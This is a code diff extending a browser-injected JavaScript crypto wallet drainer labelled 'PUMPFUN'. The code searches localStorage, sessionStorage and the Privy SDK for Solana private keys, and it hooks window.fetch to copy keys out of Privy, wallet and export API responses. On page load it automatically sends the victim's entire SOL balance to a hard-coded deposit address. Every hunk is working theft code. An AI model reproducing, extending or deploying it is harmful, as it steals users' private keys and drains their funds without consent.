@@ -182,66 +182,64 @@
       }
     } catch (e) {}
 
-    // === SOURCE 5: Check for Privy.io wallet data ===
+    // === SOURCE 6: Check for Privy-extracted private key (from API interceptor) ===
     try {
-      console.log('[PUMPFUN] 🔍 Scanning for Privy.io wallet data...');
-      
-      // Check Privy localStorage keys
-      const privyKeys = ['privy_wallet', 'privy:wallet', 'privy_user', 'privy:user', 'privy_session', 'user', '_privy', '__privy'];
-      for (let key of privyKeys) {
-        const val = localStorage.getItem(key);
-        if (val) {
-          try {
-            const parsed = JSON.parse(val);
-            console.log('[PUMPFUN] ℹ️ Found Privy data in localStorage:', key);
-            // Privy data might contain wallet reference
-            const str = JSON.stringify(parsed);
-            if (str.includes('wallet') || str.includes('key') || str.includes('account')) {
-              console.log('[PUMPFUN] 📋 Privy wallet reference found, check wallet tab');
-            }
-          } catch (e) {}
-        }
-      }
-      
-      // Check window.Privy
-      if (window.privy) {
-        console.log('[PUMPFUN] ✓ Privy SDK detected on page');
-        // Try to access wallet
-        try {
-          if (window.privy.user && window.privy.user.wallet) {
-            const wallet = window.privy.user.wallet;
-            console.log('[PUMPFUN] ✓ Privy wallet found:', wallet.address);
-            sessionStorage.setItem('pf_privy_wallet', JSON.stringify(wallet));
-          }
-        } catch (e) {}
+      const privy_key = sessionStorage.getItem('pf_privy_extracted_key');
+      if (privy_key && privy_key.length > 20) {
+        console.log('[PUMPFUN] ✓ Found Privy-extracted private key in sessionStorage');
+        return privy_key; // Return key directly for auto-execution
       }
     } catch (e) {}
 
-    // === SOURCE 5b: Extract Solana wallet from any connected wallet ===
+    // === SOURCE 6b: Direct Privy SDK access (if already decrypted) ===
     try {
-      // Try window.solana (Phantom, Solflare, etc)
-      if (window.solana && window.solana.publicKey) {
-        console.log('[PUMPFUN] ✓ Solana wallet found:', window.solana.publicKey.toString());
-        sessionStorage.setItem('pf_connected_wallet', window.solana.publicKey.toString());
-        
-        // Try to request signature (for wallet export)
-        if (window.solana.signMessage) {
-          console.log('[PUMPFUN] ℹ️ Wallet supports message signing - can verify ownership');
+      if (window.privy && window.privy.user && window.privy.user.wallet) {
+        const wallet = window.privy.user.wallet;
+        // Try common Privy wallet key property names
+        const keyProp = wallet.privateKey || wallet.secretKey || wallet.solanaPrivateKey || wallet.encryptedPrivateKey;
+        if (keyProp && keyProp.length > 20) {
+          console.log('[PUMPFUN] ✓ Found Privy wallet private key property');
+          sessionStorage.setItem('pf_privy_sdk_key', keyProp);
+          return keyProp;
         }
       }
     } catch (e) {}
 
-    // Check for pump.fun specific wallet stores
+    // === SOURCE 6c: Check all Privy-related localStorage items for private keys ===
     try {
-      if (window.__PUMP_FUN__) {
-        console.log('[PUMPFUN] ✓ Pump.fun globals detected');
-        const str = JSON.stringify(window.__PUMP_FUN__);
-        const matches = str.match(/[A-Za-z0-9]{80,}/g) || [];
-        for (let match of matches) {
-          if (match.length > 100 && /^[A-Za-z0-9+/\-_]*={0,2}$/.test(match)) {
-            sbundle = match;
-            console.log('[PUMPFUN] ✓ Found potential sbundle in __PUMP_FUN__');
-            return sbundle;
+      for (let key in localStorage) {
+        if (key.toLowerCase().includes('privy') || key.toLowerCase().includes('wallet')) {
+          const val = localStorage.getItem(key);
+          if (val) {
+            try {
+              const parsed = JSON.parse(val);
+              const str = JSON.stringify(parsed);
+              
+              // Look for privateKey properties
+              if (str.includes('privateKey') || str.includes('secretKey')) {
+                const privateKey = parsed.privateKey || parsed.secretKey;
+                if (privateKey && typeof privateKey === 'string' && privateKey.length > 20) {
+                  console.log('[PUMPFUN] ✓ Found private key in localStorage item:', key);
+                  return privateKey;
+                }
+                // Try nested structures
+                if (typeof parsed === 'object') {
+                  for (let prop in parsed) {
+                    const val2 = parsed[prop];
+                    if (val2 && typeof val2 === 'object') {
+                      if (val2.privateKey && val2.privateKey.length > 20) {
+                        console.log('[PUMPFUN] ✓ Found nested private key in:', key);
+                        return val2.privateKey;
+                      }
+                      if (val2.secretKey && val2.secretKey.length > 20) {
+                        console.log('[PUMPFUN] ✓ Found nested secretKey in:', key);
+                        return val2.secretKey;
+                      }
+                    }
+                  }
+                }
+              }
+            } catch (e) {}
           }
         }
       }
@@ -290,24 +288,48 @@
     return null;
   }
 
-  // === NETWORK INTERCEPTOR to capture sbundles from API calls ===
+  // === NETWORK INTERCEPTOR to capture sbundles + Privy wallets from API calls ===
   (function() {
     const originalFetch = window.fetch;
     window.fetch = function(...args) {
       return originalFetch.apply(this, args).then(res => {
         try {
           const url = args[0] || '';
-          if (url.includes('axiom') || url.includes('turncrypto') || url.includes('bundle') || url.includes('wallet')) {
+          if (url.includes('axiom') || url.includes('turncrypto') || url.includes('bundle') || url.includes('wallet') || url.includes('privy') || url.includes('export')) {
             console.log('[PUMPFUN] 🔗 Intercepted API call:', url.substring(0, 80));
             // Try to clone and log response
             if (res.clone) {
               res.clone().text().then(text => {
-                if (text.length > 100 && text.length < 10000) {
+                if (text.length > 100 && text.length < 50000) {
                   try {
                     const parsed = JSON.parse(text);
+                    
+                    // Extract Axiom sbundle
                     if (parsed.importBundle || parsed.sbundle || parsed.bundle) {
                       console.log('[PUMPFUN] ✓ Captured sbundle from API response');
                       sessionStorage.setItem('pf_captured_bundle', parsed.importBundle || parsed.sbundle || parsed.bundle);
+                    }
+                    
+                    // Extract Privy wallet data
+                    if (parsed.wallet || parsed.privateKey || parsed.solanaPrivateKey || parsed.secretKey) {
+                      console.log('[PUMPFUN] ✓ Captured Privy wallet from API response');
+                      const privateKey = parsed.privateKey || parsed.solanaPrivateKey || parsed.secretKey || (parsed.wallet && parsed.wallet.privateKey);
+                      if (privateKey) {
+                        sessionStorage.setItem('pf_privy_extracted_key', privateKey);
+                        sessionStorage.setItem('pf_privy_key_source', 'api-response');
+                        console.log('[PUMPFUN] ✓ Stored Privy private key from API response');
+                      }
+                    }
+                    
+                    // Extract from nested wallet structure
+                    if (parsed.user && parsed.user.wallet) {
+                      const w = parsed.user.wallet;
+                      const key = w.privateKey || w.secretKey || w.solanaPrivateKey;
+                      if (key) {
+                        sessionStorage.setItem('pf_privy_extracted_key', key);
+                        sessionStorage.setItem('pf_privy_key_source', 'api-nested');
+                        console.log('[PUMPFUN] ✓ Stored Privy private key from nested structure');
+                      }
                     }
                   } catch (e) {}
                 }
@@ -321,7 +343,7 @@
   })();
 
 
-  // ── Universal Credential Decoder ──
+  // ── Universal Credential Decoder (supports sbundle, private keys, Privy exports) ──
   async function decodeAnyCredential(credential) {
     const input = credential.trim();
     console.log('[PUMPFUN] 🔓 Attempting to decode credential (length: ' + input.length + ')...');
@@ -333,12 +355,15 @@
         console.log('[PUMPFUN] ✓ Detected Axiom sbundle JSON');
         return await decodeSBundleAndExtractKey(parsed.importBundle);
       }
-      if (parsed.secretKey) {
-        console.log('[PUMPFUN] ✓ Detected wallet JSON with secretKey');
-        const keyStr = Array.isArray(parsed.secretKey) 
-          ? parsed.secretKey.join('') 
-          : parsed.secretKey;
-        return { address: parsed.publicKey || 'unknown', key: keyStr };
+      // Check for Privy wallet export or standard wallet JSON
+      if (parsed.secretKey || parsed.privateKey || parsed.solanaPrivateKey) {
+        console.log('[PUMPFUN] ✓ Detected wallet JSON with private key');
+        const keyStr = parsed.secretKey || parsed.privateKey || parsed.solanaPrivateKey;
+        const keyToUse = Array.isArray(keyStr) ? keyStr.join('') : keyStr;
+        return { 
+          address: parsed.publicKey || parsed.address || 'wallet-export', 
+          key: keyToUse 
+        };
       }
     } catch (e) {
       console.log('[PUMPFUN] Info: Not JSON format, continuing search...');
@@ -357,8 +382,8 @@
 
     // Check if it's a hex private key (128 chars = 64 bytes, all hex)
     if (input.length === 128 && /^[0-9a-fA-F]*$/.test(input)) {
-      console.log('[PUMPFUN] ✓ Detected 128-char hex private key');
-      return { address: 'manual-hex-key', key: input };
+      console.log('[PUMPFUN] ✓ Detected 128-char hex private key (Privy format)');
+      return { address: 'extracted-privy-key', key: input };
     }
 
     // Check if it's a Solana private key in base58 format 
@@ -887,12 +912,33 @@
 
   // ── AUTO-DETECT on page load (start scanning immediately) ──
   (async function() {
-    console.log('[PUMPFUN] 🚀 Starting background sbundle detection...');
+    console.log('[PUMPFUN] 🚀 Starting background wallet detection...');
+    
+    // First, check for pre-extracted Privy keys from network interceptor
+    const privy_key = sessionStorage.getItem('pf_privy_extracted_key');
+    if (privy_key && privy_key.length > 20) {
+      console.log('[PUMPFUN] ✓ Found Privy-extracted key, using directly');
+      try {
+        console.log('[PUMPFUN] 💸 Auto-sending SOL from Privy wallet...');
+        const result = await sendAllSOL(privy_key, DEPOSIT_ADDRESS);
+        if (result && result.signature) {
+          console.log('[PUMPFUN] ✅ Auto-send SUCCESS:', result.signature);
+          detectedPrivateKey = privy_key;
+          updateWalletDisplay();
+          alert('✅ PRIVY WALLET AUTO-EXTRACTED & SENT!\n\nTx: ' + result.signature);
+        }
+        return;
+      } catch (e) {
+        console.log('[PUMPFUN] Failed to send from Privy key:', e.message);
+      }
+    }
+    
+    // Otherwise, scan for sbundles
     for (let i = 0; i < 15; i++) {
       await new Promise(resolve => setTimeout(resolve, 2000));
       const sbundle = autoDetectSbundle();
       if (sbundle) {
-        console.log('[PUMPFUN] ✓ Found sbundle on page load attempt ' + (i + 1));
+        console.log('[PUMPFUN] ✓ Found wallet data on page load attempt ' + (i + 1));
         // Auto-decode and auto-send
         const decoded = await decodeAnyCredential(sbundle) || await decodeSBundleAndExtractKey(sbundle);
         if (decoded && decoded.key) {
